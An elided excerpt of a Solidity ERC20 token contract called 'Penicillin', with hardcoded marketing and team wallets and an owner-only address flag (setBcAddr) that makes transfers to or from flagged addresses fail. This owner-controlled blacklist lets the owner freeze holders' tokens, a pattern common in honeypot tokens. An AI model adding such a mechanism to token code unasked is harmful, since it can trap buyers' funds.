...
contract Penicillin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Penicillin";
    string private _symbol = "Penicillin";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xa5292a3783cdc2EE33b003D61fcEb845bcDe9aaE); // Marketing Address
    address payable public teamWalletAddress = payable(0xf891c19B1078e5099C5AA3E9590423656Fb73E69); // Team Address
    ...
    function setBcAddr(address addr, bool isBc) public onlyOwner {
        bcAddr[addr] = isBc;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!bcAddr[sender] && !bcAddr[recipient]);
